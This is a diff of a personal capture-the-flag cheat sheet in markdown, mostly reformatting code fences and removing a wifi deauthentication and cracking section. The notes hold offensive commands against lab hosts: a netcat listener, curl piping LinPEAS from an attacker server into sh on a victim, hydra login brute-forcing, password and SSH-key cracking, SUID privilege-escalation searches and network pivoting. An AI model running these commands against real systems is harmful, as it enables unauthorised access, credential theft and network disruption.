@@ -1,4 +1,6 @@
 ## Tools
+[Airmon-ng](./Tools/Airmon-ng.md)
+
 [Nmap](./Tools/Nmap.md)
 
 [OpenVPN](./Tools/OpenVPN.md)
@@ -24,7 +26,7 @@ site:instagram.com intext:2mdtln
 
 https://annas-archive.org
 
-```zsh
+```bash
 cat ~/.zsh_history
 sudo dpkg -i
 nc -lvnp 2144
@@ -39,7 +41,7 @@ export IP={Machine IP}
 ```
 
 ### traceroute
-```zsh
+```bash
 ┌──(mamy👻Mamy)-[~]
 └─$ traceroute google.com
 traceroute to google.com (172.217.17.238), 30 hops max, 60 byte packets
@@ -62,25 +64,25 @@ traceroute to google.com (172.217.17.238), 30 hops max, 60 byte packets
 ```  
 
 ## dirb
-```zsh
+```bash
 dirb http://10.10.86.183/
 
 ```
 
 ## gobuster 
-```zsh 
+```bash 
 gobuster dir -u http://10.10.13.178/ -w /usr/share/dirb/wordlists/common.txt
 ```
 ## find
-```zsh
+```bash
 find / -type f -name user.txt 2>/dev/null
 ```
 ## Privilege escalation
 https://gtfobins.github.io/
-```zsh
+```bash
 find / -user root -perm /4000 2>/dev/null
 ```
-```zsh
+```bash
 cat /etc/passwd
 ```
 ===> LinPEAS
@@ -88,17 +90,17 @@ cat /etc/passwd
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
 -> From github
-```zsh
+```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 -> W/ Local network
 
 #Host
-```zsh
+```bash
 sudo python3 -m http.server 80
 ```
 #Victim
-```zsh
+```bash
 curl 10.17.72.21/linpeas.sh | sh
 ```
 -> or [scp](https://github.com/2mdtln/CTFNotes?tab=readme-ov-file#scp) it 
@@ -108,33 +110,33 @@ curl 10.17.72.21/linpeas.sh | sh
 https://www.youtube.com/watch?v=VM64fH6tEEU&ab_channel=RyanJohn
 
 ## hydra 
-```zsh
+```bash
 hydra -l ~Username~ -P 'list.txt' ssh://10.10.65.127
 ```
 
-```zsh
+```bash
 hydra -l admin -P '/home/mamy/Desktop/rockyou.txt' -f 10.10.222.32 http-get /labs/basic_auth/    
 ```
-```zsh
+```bash
 hydra -l admin -P /home/mamy/Desktop/rockyou.txt 10.10.115.52 http-post-form "/admin/:user=admin&pass=^PASS^:F=Username or password invalid" -vV 
 ```
-```zsh
+```bash
 hydra -l John -P /home/mamy/Desktop/rockyou.txt 10.10.56.31 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password" -s 62337
 ```
 
 ## Find id-rsa passphrase
-```zsh
+```bash
 zssh2john '/home/kali/Desktop/id_rsa' > ToJohn.txt
 ```
-```zsh
+```bash
 john 'ToJohn.txt' --wordlist='/home/kali/Desktop/rockyou.txt' 
 ```
 ## enum4linux (Userrames) (too slow)
-```zsh
+```bash
 enum4linux 10.10.130.7
 ```
 ## binwalk
-```zsh
+```bash
 binwalk /home/kali/Desktop/cutie.png      
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -144,7 +146,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive, footer length: 22
 ```
-```zsh
+```bash
 binwalk -e /home/kali/Desktop/cutie.png  
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -157,40 +159,23 @@ WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Err
 34820         0x8804          End of Zip archive, footer length: 22
 ```
 ## steghide
-```zsh
+```bash
 steghide extract -sf /home/mamy/Desktop/useless/white_rabbit_1.jpg 
 
  Enter passphrase: 
  wrote extracted data to "hint.txt".  
 ``` 
 ## hashcat
-```zsh
+```bash
 echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
 
 hashcat -m 0 -a 0 hash.txt '/home/kali/Desktop/rockyou.txt'
 ```
-## airmon
-   ```bash
-   sudo airmon-ng start <interface>
-   ```
-   ```bash
-   sudo airodump-ng wlan0mon
-   ```
-   ```bash
-   sudo airodump-ng -c <channel> --bssid <BSSID> -w <output_file> wlan0mon
-   ```
-
-   ```bash
-   sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
-   ```
-   ```bash
-   sudo aircrack-ng -w <wordlist> -b <BSSID> <output_file>.cap
-   ```
 ## John
-```zsh
+```bash
 sudo ssh2john "/home/mamy/Desktop/useless/id_rsa (copy 1)" > HashForJohn.txt
 ``` 
-```zsh                                             
+```bash                                             
 john /home/mamy/Desktop/HashForJohn.txt --wordlist='/home/mamy/Desktop/rockyou.txt'
 
 Using default input encoding: UTF-8
@@ -205,25 +190,25 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 ## scp
-```zsh
+```bash
 sudo scp -i id_rsa chisel root@10.200.52.200:/root
 ```
-```zsh
+```bash
 sudo scp <user@machineip>:(file name) /home/kali/Desktop
 ```
 ![alt text](/assets/image.png)
 
 ## xfreerdp 
-```zsh
+```bash
 xfreerdp /v:10.200.52.150 /u:Mamyy /p:123455
 ```
 ## sshuttle(vpn to ssh)
-```zsh
+```bash
 sudo sshuttle -NHr root@10.200.52.200 --ssh-cmd 'ssh -i id_rsa' 10.200.52.0/24 -x 10.200.52.200
 c : Connected to server.
 ```
 ## crunch
-~~~zsh
+```bash
 crunch 3 3 -o otp.txt -t %%% -s 100 -e 200 
-~~~
+```
 
